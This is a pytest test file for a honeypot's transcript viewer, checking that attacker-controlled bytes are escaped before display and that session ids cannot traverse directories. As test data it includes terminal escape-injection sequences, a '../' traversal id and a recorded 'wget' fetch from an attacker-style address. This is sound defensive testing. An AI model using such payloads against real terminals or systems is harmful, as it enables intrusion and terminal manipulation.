"""Tests for tools/transcript.py: decoded transcript bytes are attacker-controlled, so the
important property is that nothing in its output can act on the operator's terminal."""
from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "tools"))

import transcript  # noqa: E402
from honeypot.logging.events import TranscriptWriter  # noqa: E402


def _line(direction: str, data: bytes, timestamp: str = "2026-10-22T09:00:00Z") -> str:
    return json.dumps({"timestamp": timestamp, "direction": direction,
                       "data_b64": base64.b64encode(data).decode()}) + "\n"


def test_hostile_bytes_are_shown_not_emitted():
    hostile = b"a\x1b]0;pwned\x07b\rfake\x7f\xc2\x9b31m\xe2\x80\xaeevil\xe2\x80\x8b\xff\xfe"
    out = "\n".join(transcript.render_transcript(iter([_line("recv", hostile)])))
    for bad in ("\x1b", "\x07", "\r", "\x7f", "\x9b", "‮", "​", "�"):
        assert bad not in out
    assert ("a\\x1b]0;pwned\\x07b\\x0dfake\\x7f\\x9b31m\\u202eevil\\u200b\\xff\\xfe") in out


def test_newlines_and_tabs_survive_and_crlf_folds():
    out = list(transcript.render_transcript(iter([_line("send", b"one\r\ntwo\tcols\n")])))
    assert out[1:] == ["    one", "    two\tcols"]


def test_same_direction_chunks_merge_into_one_block():
    lines = [_line("recv", b"u"), _line("recv", b"name -a\n"),
             _line("send", b"Linux\n"), _line("recv", b"\xe6\x97"), _line("recv", b"\xa5\n")]
    out = list(transcript.render_transcript(iter(lines)))
    assert out == ["--- 2026-10-22T09:00:00Z  client ->", "    uname -a",
                   "--- 2026-10-22T09:00:00Z  <- honeypot", "    Linux",
                   "--- 2026-10-22T09:00:00Z  client ->", "    日"]   # split UTF-8 rejoined


def test_input_only_drops_honeypot_output():
    lines = [_line("recv", b"id\n"), _line("send", b"uid=0(root)\n")]
    out = list(transcript.render_transcript(iter(lines), input_only=True))
    assert out == ["--- 2026-10-22T09:00:00Z  client ->", "    id"]


def test_malformed_lines_are_reported_not_fatal():
    lines = ["{not json\n", json.dumps({"direction": "recv", "data_b64": "!!"}) + "\n",
             _line("recv", b"ls\n")]
    out = list(transcript.render_transcript(iter(lines)))
    assert out.count("--- ?  [error]") == 2
    assert out[-1] == "    ls"


def test_reads_what_transcriptwriter_writes(tmp_path, monkeypatch, capsys):
    writer = TranscriptWriter(tmp_path, "abc123")
    writer.record("recv", b"wget http://198.51.100.1/x\r\n")
    writer.record("send", b"\x1b[2J# ")
    writer.close()

    monkeypatch.setattr(sys, "argv", ["transcript.py", "abc123", "--dir", str(tmp_path)])
    transcript.main()
    out = capsys.readouterr().out
    assert "    wget http://198.51.100.1/x\n" in out
    assert "    \\x1b[2J# " in out and "\x1b" not in out


def test_bare_session_id_cannot_walk_out_of_the_transcript_dir(tmp_path, monkeypatch):
    monkeypatch.setattr(sys, "argv", ["transcript.py", "../outside-the-dir", "--dir", str(tmp_path)])
    with pytest.raises(SystemExit) as exc:
        transcript.main()
    assert "no such transcript file" in str(exc.value)
